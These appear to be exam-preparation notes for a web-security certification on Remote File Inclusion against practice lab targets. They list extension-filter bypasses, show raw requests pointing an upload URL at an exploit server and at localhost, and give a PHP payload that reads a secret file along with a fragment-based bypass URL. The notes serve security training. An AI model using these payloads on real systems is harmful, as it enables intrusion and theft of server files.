
### Remote File Inclusion
> RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be `HTTPS` and the file **extension** is checked, but the MIME content type or file content is maybe not validated. Incorrect RFI result in response message, `File must be either a jpg or png`.

> Methods to bypass extension validation:
1. Extension with varied capitalization, such as .`sVG`
2. Double extension, such as `.jpg.svg` or `.svg.jpg`
3. Extension with a [delimiter](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/delimiters.txt), such as `%0a, %09, %0d, %00, #`. Other examples, `file.png%00.svg` or `file.png\x0d\x0a.svg`
4. Empty filename, `.svg`
5. Try to cut allowed extension with more than the maximum filename length.

> Below scenario could be exploited using [SSRF](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#ssrf---server-side-request-forgery) or RFI. Did not solve this challenge.....
```
POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=https://EXPLOIT.net/image.sVg
```

```
POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
```

[![RFI function](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/RFI-function.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/RFI-function.png)

> I am missing some key info and need to _**identify**_ PortSwigger research about RFI.


**Use this for the exam** But the method below works for sure. It is taken from DingyShark's git ([https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities))
1. To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. To bypass filters and provoke RFI, use the next payload:
	1. Put this in the upload blog title image from url field
```
https://exploit-server.com/shell.php#kek.jpg
```
